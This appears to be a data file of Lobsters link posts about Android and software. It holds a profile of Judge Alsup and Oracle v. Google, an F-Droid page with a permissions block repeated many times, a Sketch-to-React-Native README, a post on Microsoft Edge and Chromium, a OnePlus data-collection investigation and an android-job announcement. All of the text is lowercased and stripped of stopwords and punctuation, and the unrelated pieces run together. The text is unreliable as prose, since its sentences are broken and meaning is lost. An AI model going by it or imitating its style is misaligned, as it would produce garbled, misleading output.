question heart case one feared oracle v google could profession oracle brought multiple patent claim copyright claim google lose across board trial presided judge alsup oracle appealed federal circuit ruled favor google tried appeal supreme court declined hear case sent back judge alsup district court case tried jury came back favor google appeal pending federal circuit seven year litigation lawsuit stage boiled single question google use java apis infringe oracle copyright software copyright difficult grapple come music movie literature painting even bikram yoga pretty easy opinion whether something copied software hand awkward late addition original copyright act shoehorned section literary work copyright supposed cover creative work useful functional functional element anything mannequin accounting ledger computer program menu barred copyrightable code functional tool creative expression code functional tool creative expression extent code conveys meaning seem like art form valid claim copyright think programmer refer elegant code badly written code code executed move robot arm pick fasten bolt seems entirely functional therefore kind thing addressed copyright copyright urinal could probably copyright sculpture urinal like duchamp famous work code time seen court wrestling decade say james grimmelmann law professor cornell tech institute worked microsoft programmer turn actually carving piece software functional nonfunctional part really hard say requires really nuanced understanding something mean something software oracle v google case concern specific component software application programming interface apis collection welldefined interaction sort shorthand quickly access service library functionality apis compared dictionary word definition john bergmayer senior staff attorney public knowledge say like collection proverb idiom need know idiom able speak grammatically correct english many esl student know going hell time communicating without idiom might lovely turn phrase common pool speaker simply serf shorthand something might take time spell similarly apis often condense commonly used particularly complex code question heart oracle v google section b copyright act excludes copyright protection idea procedure process system method operation application programming interface process system method operation creative expression warrant copyright protection google first created android company made decision would compatible java popular programming language using java android could tap existing community developer maybe even existing code anyone could write java sun microsystems developed language maintained strict control java standard edition java mobile edition allow java code deployed desktop computer mobile phone google reimplementation java apis almost entirely written whole cloth negotiation license java broke army engineer google wrote clean room implementation java se meaning code reverse engineered team forbidden accessing original code oracle acquired sun matter month filed lawsuit google android google reimplementation java apis almost entirely written whole cloth shared declaring code code identifies name constituent part code apis java standard edition structure sequence organization implementation looked similar rangecheck infamous nine line code made way android way joshua bloch suspiciously previously worked sun microsystems authored many java apis unfortunate coincidence judge alsup later determined bloch continued contribute openjdk opensource implementation java left sun google code wound android java se innocuous circumstance order compatible java certain call certain apis look example method find maximum value set number quite sensibly named javalangmathmax oracle argued google could called javalangarithlarger google argued java apis similar qwerty keyboard layout sure keyboard could organized way keyboard manufacturer keep making qwerty keyboard people used setup language build top language part mean apis look similar java regular expression api reimplementation perl java string formatting api reimplementation c one reason programmer get arm oracle v google make sense police google something everyone else forever general consensus among software developer oracle wrong apis meant used restrict usage would subvert purpose indeed even oracle hard time consistent position corporate witness oracle said deposition java apis java language free use inseparable backtrack lunch break sweating profusely oracle v google went trial first time jury found favor google every patent claim copyright question since split two stage claimed element apis copyrightable begin copyrightable fair use first question decided judge alsup second jury jury hung question whether google use java apis fair use turned matter seemed judge alsup ruled oracle copyright declaring code structure sequence organization implementing code infringement nothing infringe alsup concluded structure sequence organization api implementing code functional rather creative nature alsup opinion distinctive meticulousness technical savvy case witness lawyer struggled explain apis comparing everything file cabinet electric wall socket alsup opinion distinctive meticulousness technical savvy page end describes code work difference source code object code class declaration header subroutine method interface package even includes sample code hard imagine judge without alsup long experience coder coming opinion alsup background certainly came handy ruled rangecheck infamous nine line code kind thing done many time quickbasic say five year hearing judge us microsoft quickbasic integrated development environment compiler basic program given problem quickbasic certain could go back within hour would working quickbasic model spoke judge careful talking oracle v google since second appeal still pending federal circuit seemed like still irritated oracle attempt cast copied line rangecheck big deal coder may even felt little sorry beleaguered author rangecheck incident bothered alsup much spent entire section opinion oracle made much nine line code crept android java circumstance innocuous overblown oracle actual fact found herein judge set forth benefit court appeal nine line code never came case alsup opinion oracle v google grimmelmann say detailed difficult nuanced engagement judiciary ever software copyright teach oracle v google ip class framing java work different element source code judging case piece writing pedagogical thanks meticulousness opinion great deal alsup understanding java software development remains preserved law passed young wouldbe lawyer may lasting mark left remarkable ruling coder judge judgment completely overturned judging case piece writing pedagogical alsup ruling oracle v google went appeal almost immediately court appeal federal circuit came back shocking reversal one resulted countless law review article penned irate scholar copyright law appeal court wrote oracle unlimited option selection arrangement line google copied oracle name function javalangmathmax could called number thing like mathmaximum arithlarger small tell like one suggest overall unfamiliarity code another part opinion court say google free develop api package lobby programmer adopt google appealed federal circuit decision supreme court declined take case suit sent right back started judge alsup san francisco second jury trial may jury found fair use favor google google may case still pending oracle appealed federal circuit clear actual effect case time jury verdict fair use provide guideline okay copy declaring code structure sequence organization api whatever insight clarity alsup written opinion built upon long experience basic simply evaporated away blown bit appellate court photo sarah jeong verge alsup shy coding chop think good programmer think read program see since taught everything pretty nifty programming device quickbasic program added java judge coding ever since got first computer old ibm since consigned dark dusty corner barn yosemite ranch used floppy disk hard drive could get version one floppy drive could get version two wife sprang luxe twodrive version computer came two book one do operating system basic point looked basic book decided would learn taught straight book recall pretty straightforward first program wrote example one simple routine arithmetic became increasingly complex one would play blackjack one played sevencard stud stored floppy disk destroyed twoyearold son ravaged stapler proud alsup said wistfully alsup shortwave radio propagation predicting program photo sarah jeong verge program written shortwave radio propagation predictor proud good reason relatively complex piece software multiple dependency retrolooking graphic interface including azimuthal projection map based starting location pick complete colored line track movement sun extensive database compiled hand atlas immensely proud massive amount time spent data entry hour becoming article iii judge appointed president united state program predicts best time target ham radio signal various part world calculating two endpoint specifies even generating table data key location selected globe even started coding program commercial version available similar program say wanted fun able see could callsign put november six xray mike whiskey us program calibrate yaesu mk v field radio talk friend world including childhood friend junior feild operator friend made place far away japan new zealand still spends couple hour operating radio every month mostly sierra foothill callsign put november six xray mike whiskey judge spent almost hour explaining particular program going various input change shortwave radio propagation well science behind interview turned impromptu physic tutorial patiently explained solar flux kindex ionosphere predicting radio propagation take account constantly fluctuating variable change depending trying reach well time year time day put variable hit enter computer begin calculate see said thinking indeed computer screen blank except word lengthy demonstration program run trouble dependency break reason let input new york city location good mutter goofed admits agree try different location entirely program run smoothly alsup coded relative isolation decade learning book compiling database hand marked difference typical practice current generation software developer whose workflow habit often tap larger community google solution check stackexchange use preexisting library everything written written scratch fact alsup closest encounter culture community sprung around programming seems oracle v google infamous exchange second trial erstwhile sun ceo jonathan schwartz tried explain free opensource software jury starting gnu project integral linux loosely described operating system associated suite software gnu stand alsup interrupted ask gnu unix said schwartz make sense judge replied g part stand gnu schwartz confirmed make sense judge replied laughter courtroom nothing like uproar twitter afterward hundred nerd across world facepalmed even later saw webcomic exact exchange gnu acronym recursive meaning invokes infinite loop move frequently come computer programming host recursive acronym programming including php php hypertext processor curl curl url request library unofficially search engine bing bing google bad inside joke embarrassing marker insular culture never anticipated explain court law alsup despite coder long know gnu stood moment little chagrined asked apparently engineer friend one backpacking buddy teased gnu remark know recursive feature definition alsup said explained like okay kind cute recent shift computer programming made difficult alsup keep hobby year ago made effort learn python fell wayside got busy presumably day job federal judge microsoft since stopped bundling quickbasic window making impossible alsup run program newer computer poetic way judge presided major compatibility case victim compatibility issue photo sarah jeong verge december alsup preside waymo v uber potentially multibilliondollar lawsuit uber accused stealing intellectual property around selfdriving car technology division alphabet waymo grapple core principle intellectual property law way oracle v google like case outcome could change face industry forever conversation alsup careful discus ongoing waymo case enthusiastic science surrounding lawsuit time interest photography optic might relevant waymo v uber march alsup requested side name book treatise lidar laserbased detection system used selfdriving car issue case could read court order sternly cautioned party patronize please keep mind judge already familiar basic light optic principle involving lens focal length nonlinear nature focal point function distance object lens object get focused screen behind lens use lens project well focus useful would literature adapting lidar selfdriving vehicle including various strategy positioning lightemitting diode behind lens best overall effect well use single lens project outgoing light well focus incoming reflection course patent suit court order sternly cautioned party patronize alsup also asked tutorial lidar presented lawyer side something lot different case enjoys tutorial said listens carefully still suspect understands technology better lawyer great number case long memory lawyer suspect trying get one run engineering background acid tongue like geek bear grudge dodgy obfuscation technology case took place decade ago regarding patent involving fasttrak bay area automated bridge toll pay tracking device two party come legally binding agreement technical aspect patent interpreted instead rubberstamping stipulation judge alsup pored patent come conclusion stipulation made sense knew technology told wrote order said refuse accept stipulation really mean agreed right party settled case shortly thereafter guess thought judge crazy guess thought judge crazy alsup aggressive handling attorney full display waymo perhaps fueled deep disapproval million dollar alphabet uber burning best litigator business past open distaste money corporation fling around court one posttrial hearing oracle v google snapped know many social security claimant rule arguing cost bill waymo particular called press scrutinize two company behave court telling journalist keep eye party chooses get rid juror technical background jury selection meanwhile alphabet even lyft fighting keep portion trial closed press claiming valuable trade secret might exposed public group medium company including verge parent company vox medium since intervened lawsuit asking keep courtroom open certain part lawsuit involve fair number trade secret remain sealed alsup adamant press right know much one hearing lawyer uber asked appear camera making meeting closed public hearing got going judge alsup concluded overstep use secrecy motivated embarrassment rather legitimate reason listen please nt said going lot adverse headline case side ca nt stop public right said judge classic alsup twist fact whole transcript going make public excerpt transcript march hearing waymo v uber since alsup divided docket two clerk call criminal desk ip desk case fall either category evenly split two day often look kind stem background ip desk necessary help bill toth ip clerk oracle v google stem background told judge specifically asked take computer science course preparation clerkship asked alsup laughed little recollection making toth take class acknowledge sometimes give clerk head kind case coming way kind class might useful ahead time bill toth clerking federal circuit chief judge sharon prost allowed work oracle v google appeal course would conflict interest toth part new class lawyer one time represent larger share profession although religious study major turned lawyer coder programming fun toth told competed google code jam terribly seriously past three four year using java think made past qualifying round definitely learning bunch time around besides computer science course alsup made take already knew html javascript cs basic tiny bit python perl ever applied clerk alsup toth declined comment whether coding skill ever came play worked oracle v google hard imagine made difference tech community maintains entrenched belief law never understand tech community maintains entrenched belief law never understand certainly higherlevel court decision made oracle v google nothing dispel notion yet alsup existence challenge belief former engineering student quietly delightedly tinkering away basic decade playing radio camera teaching clerk random journalist alike thing know patient meticulous manner alsup explained ionosphere explained software federal circuit oracle opinion precise specific forced federal circuit engage software development otherwise might regardless federal circuit ultimate decision great deal alsup understanding software remains preserved appellate caselaw opinion taught law school intellectual property class tech sector attracts money techspecialized lawyer emerging meet demand many reared alsup careful pedagogy transmitted word paper lucky transmitted person hour conclude interview leave courthouse email subject line found bug informing figured error showing shortwave radio propagation program remmed earlier key line reason ca nt remember reactivated fixed writes thought back last moment office packing recorder notebook called geek judge look perplexed ask good thing insist chuckle little response day geek something wanted
222,Lobsters,android,Android,F-Droid 1.0 released (with screenshots and feature graphics),https://f-droid.org/packages/org.fdroid.fdroid/,fdroid released screenshots feature graphic,source tarball download apk pgp signature build log source tarball download apk pgp signature build log source tarball download apk pgp signature build log source tarball download apk pgp signature build log source tarball download apk pgp signature build log source tarball download apk pgp signature build log source tarball download apk pgp signature build log source tarball download apk pgp signature build log source tarball download apk pgp signature build log source tarball download apk pgp signature build log source tarball download apk pgp signature build log source tarball download apk pgp signature build log,although apk downloads available give choice aware installing way receive update notification le secure way download recommend install fdroid client use version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader androidpermissionusbpermission prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader androidpermissionusbpermission prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader androidpermissionusbpermission prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader androidpermissionusbpermission prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader androidpermissionusbpermission prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader androidpermissionusbpermission prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader androidpermissionusbpermission prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader androidpermissionusbpermission prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader androidpermissionusbpermission prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet view network connection allows app view information network connection network exist connected view wifi connection allows app view information wifi networking whether wifi enabled name connected wifi device allow wifi multicast reception allows app receive packet sent device wifi network using multicast address phone us power nonmulticast mode change network connectivity allows app change state network connectivity connect disconnect wifi allows app connect disconnect wifi access point make change device configuration wifi network pair bluetooth device allows app view configuration bluetooth phone make accept connection paired device access bluetooth setting allows app configure local bluetooth phone discover pair remote device run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running read content shared storage allows app read content shared storage modify delete content shared storage allows app write content shared storage modify system setting allows app modify system setting data malicious apps may corrupt system configuration control near field communication allows app communicate near field communication nfc tag card reader prevent phone sleeping allows app prevent phone going sleep download apk mib pgp signature build log
223,Lobsters,android,Android,Convert Sketch files into React Native components,https://github.com/nanohop/sketch-to-react-native,convert sketch file react native component,convert sketch file react native component want try without installing everything chris nanohopcom want collaborate join u slack want service human loop chris nanohopcom getting started prerequisite step run extract component sketch svg use svg file argument convertjs nt work conversion process note difficult part faq nt airbnb already release something reactsketchapp react native mobile react web chris nanohopcom generated code good much time save use headless chrome way try without installing everything chris nanohopcom ca nt yet sketch plugin automatically help example generated code,convert sketch file react native component design sketch need turn mobile app take design automatically create react native component want try without installing everything send sketch file instruction run email output back chris nanohopcom want collaborate join u slack want service offer also offer human loop clean output go back send email learn chris nanohopcom getting started prerequisite step run git clone http githubcomnanohopsketchtoreactnativegit cd sketchtoreactnative npm install npm link sketchtoreactnative desktopmyfilesvg extract component sketch svg use svg file argument convertjs sketchtoreactnative inputfilesvg run save output output folder make sure grab j file associated image folder drop react native application see magic nt work please let know early software trying solve many edge case find please file issue send email conversion process sketch export fairly clean svg make process easier still lot processing involved basic step prep svg make processing easier use deep neural net filter unwanted element get component bounding box using headless chrome figure childparent relationship convert absolute pixel positioning flex box extract image svg path polygon generate style every component generate component export output file note difficult part sketch svg export pixel based absolute positioned system good react native one primary difficulty figuring proper parent sibling relationship component converting absolute positioning flexbox still work clean part general working fairly well input also mean component sketch partially overlap nt well conversion process working fix get best result partially overlapping component sketch file fully overlapping fine get properly converted parent child relationship faq nt airbnb already release something nope probably thinking reactsketchapp take react component generates sketch file go opposite direction take sketch file creates react native component react native mobile react web started mobile app design mobile generally straightforward le variation easier make first version planning react web well though send email like update available chris nanohopcom generated code good mobile developer rightfully fearful generated code really high priority list keep output clean readable possible perfect time one top priority much time save found screen would normally take hour create take little minute much time saving output cleaned little bit generally find usually provides good starting point use headless chrome seems like overkill headless chrome great svg rendering engine easiest way get bounding box work export svg asset pngs probably change future way try without installing everything plan get hosted version point email sketch file instruction run email component back chris nanohopcom ca nt yet work progress thing nt well overlapping component reusing component style reusing common component collapsing unnecessary wrapping view long roadmap feature add sketch plugin automatically yet roadmap help like help love involved feel free file issue send email sketch file nt work quite right also review merge pull request well example see perfect provides really good starting point getting better time generated code import react component react import stylesheet text view touchableopacity textinput scrollview image reactnative import backarrow loginpageimagesbackarrowpng import logo loginpageimageslogopng export default class main extends component render return scrollview style flex alignself stretch paddingtop backgroundcolor view style stylesbase image source backarrow style stylesbackarrow image source logo style styleslogo view style stylesemailinput text style stylesemailaddress email address text view view style stylespasswordinput text style stylespasssord password text view view style stylesloginbutton text style styleslogin log text view view scrollview const style stylesheetcreate base height backgroundcolor borderradius paddingtop paddingbottom backarrow alignself flexstart marginleft logo alignself center margintop emailinput height backgroundcolor fafafa borderradius alignself center margintop width alignitems flexstart marginleft justifycontent center emailaddress backgroundcolor transparent fontsize fontweight color textalign left marginleft passwordinput height backgroundcolor fafafa borderradius alignself center margintop width alignitems flexstart marginleft justifycontent center passsord backgroundcolor transparent fontsize fontweight color textalign left marginleft loginbutton height backgroundcolor borderradius alignself center margintop width alignitems center justifycontent center login backgroundcolor transparent fontsize fontweight color ffffff textalign center
224,Lobsters,android,Android,Microsoft Using Chromium On Android Is Bad For The Web,http://robert.ocallahan.org/2017/10/microsoft-using-chromium-on-android-is.html,microsoft using chromium android bad web,us chromium least secure engine,microsoft releasing edge android us chromium bad web bad engine diversity really essential open web user even relatively small number using edge engine android would good step going chromium increase web developer expectation browser android even chromium le thoughtful sort developer ie pretty much everyone say microsoft take path nt mozilla instant gratification compatibility thanks single engine slow accumulation unfixable bug due de facto standardization register platform thoroughly rotted escape alternative singlevendor platform developer even beholden vendor sure would quite lot work port edge android microsoft resource porting browser engine nt research problem microsoft would rather save resource promote browser engine perhaps switching chromium window next course would even worse web hard believe microsoft stopped caring extent ever course edge us webkit io also bad apple ongoing decision force browser use least secure engine nothing new
226,Lobsters,android,Android,OnePlus OxygenOS built-in analytics,https://www.chrisdcmoore.co.uk/post/oneplus-analytics/,oneplus oxygenos builtin analytics,update jaczekanski sans holiday hack challenge oneplus owasp zap amazon aws apache hadoop slack activity venomsarad one thread reddit baksmali,update gaining traction online twitter user jaczekanski pointed way remove oneplus device manager app via adb without requiring root substitute netoneplusodm pkg whilst completing sans holiday hack challenge cause proxy internet traffic phone oneplus owasp zap security tool attacking web application amidst traffic noticed request domain seen openoneplusnet decided examine little closer first question connecting openoneplusnet obviously top level domain oneplusnet belongs manufacturer device open bit dns lookup find point amazon aws instance mention apache hadoop record located region next question sent example screenshot see two request sent http first pictured sending authentication information oauthtoken second interesting request cloudpushdata two parameter accesstoken oauth token returned first request data appears encoded decoding parameter give u json show formatting mine ty dl id en screenoff t oed rv id en screenon t oed rv id en unlock t oed rv id en abnormalreboot t oed rv ok look like collecting timestamped t field event time millisecond since unix epoch seeing metric certain event understand development point view wanting know abnormal reboots seems legitimate screen onoff unlock activity feel excessive least anonymised right well really taking closer look id field seems familiar phone serial number le enthusiastic used oneplus tie event back personally bought handset directly suppose leave traffic proxied time see information collected boy ty dl ac av bl br oneplus b charging co gb ga gc ge gn iac id im la en log aa bb cc dd ee ff mdmv mn one nci ncn noi non ee lte npc gb npn nwa aa bb cc dd ee ff nwb ff ee dd cc bb aa nwh false nwl nw chrisdcmoore ov oxygen one pcba rh ro false romv rw sov t tz amongst thing time phone imei phone number mac address mobile network name imsi prefix well wireless network essid bssid course phone serial number wow quite bit information device even tied directly back oneplus entity get worse ty dl id pn pvc tk id pn pvc tk timestamp range unix epoch millisecond opened closed application phone data see tuesday jan slack open utc utc microsoft outlook app open utc utc take two example stamped phone serial number get even worse ty dl id pi si t pn comandroidchrome pvn pvc cn chrometabbedactivity en start aed sa true rv id pi si t pn comandroidsystemui pvn pvc cn recentsactivity en stop aed sa true rv id pi si t pn comandroidsettings pvn pvc cn wifisettingsactivity en start aed sa true rv id pi si t pn comandroidsettings pvn pvc cn setting en start aed sa true rv event data contain timestamps activity fired application stamped phone serial number took twitter ask oneplus twitter could turned disappointingly led usual path troubleshooting suggestion met radio silence member community venomsarad noticed tweet suggested even wanted oneplus support allowed suggest disabling application time might better spent looking forum searching mention analytics data collection came across forum post varying relevance closest one well thread reddit based tweet july rather closely mirroring sentiment reading reddit thread learn code responsible data collection part oneplus device manager oneplus device manager provider run oneplusanalyticsjobservice oneplus system service case service sent data approximately hour using pm locate application package file find located systemprivappopdevicemanageropdevicemanagerapk grabbing apk extracting using apktool give u manifest resource bytecode system application optimised classesdex file removed apk archive optimised architecturespecific odex file placed case running combination bootoat baksmali give u bytecode analysis oneplus device manager opdm drive oneplus system service utilises bunch library expected given data seen others le comgooglegson comsquareupokhttp serialisation making request also namespaces imply geolocation functionality comamapapi comautonaviapsamapapi list public method netoneplusodmcommonutilssmali give u good idea breadth functionality indication kind data might collate method public static ljavalangstring ljavalangstring method public static getandroidversion ljavalangstring method public static getbssid landroidcontentcontext ljavalangstring method public static getbatterylevel landroidcontentcontext f method public static getbatterystatus landroidcontentcontext ljavalangstring method public static getbrandname ljavalangstring method public static getcellsignallevel landroidcontentcontext ljavalangstring method public static getdeviceid ljavalangstring method public static getimei landroidcontentcontext ljavalangstring method public static landroidcontentcontext ljavalangstring method public static getishiddenssid landroidcontentcontext z method public static getlocale landroidcontentcontext ljavautillocale method public static getmacaddr landroidcontentcontext ljavalangstring method public static getmodelname ljavalangstring method public static getosversion ljavalangstring method public static getpcba ljavalangstring method public static getresolutionheight landroidcontentcontext method public static getresolutionwidth landroidcontentcontext method public static getromversion ljavalangstring method public static getsimcountrycode landroidcontentcontext ljavalangstring method public static getsoftversion ljavalangstring method public static gettimezone ljavalangstring method public static getwifimacaddress landroidcontentcontext ljavalangstring method public static getwifissid landroidcontentcontext ljavalangstring method public static getwifisignallevel landroidcontentcontext method public static z method public static z method public static isrooted z unfortunately system service appear way permanently disabling data collection removing functionality without rooting phone one alternative would stop service every time boot phone assuming get periodically restarted using app achieve effect perhaps prevent communication openoneplusnet somehow kind data collection especially one containing information directly tied back individual really optin andor easily accessible
227,Lobsters,android,Android,Announcing android-job library 1.2.0,https://blog.evernote.com/tech/2017/10/06/announcing-android-job-library-1-2-0/,announcing androidjob library,androidjob two year ago version androidjob list new capability,scheduling background job android headache google introduced quite apis year also changed behavior difficult developer pick correct framework implement necessary class properly order use feature newer apis support older device time need write lot boilerplate code evernote faced challenge internally created unified job library solve pain point long testing period released androidjob open source two year ago since library popularity grown today used twitter dropbox pocket new york time course evernote first version library helped deal two power saving mode doze app standby android marshmallow next release backported feature android nougat today happy publish version androidjob new version make easy handle new background execution limit added android oreo new android feature backported deal version check inconsistency app work android device back android aka ice cream sandwich list new capability long noteworthy new transient job feature starting job immediately running specific job day new job requirement like storage low upgrading new version straightforward api change compared version documented wiki looking forward feedback would love know make use androidjob inside app
228,Lobsters,android,Android,October 4th 9 AM PDT - Google Event,https://www.youtube.com/watch?v=0YGoxbeSzLc,october pdt google event,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature october google event youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature october google event youtube
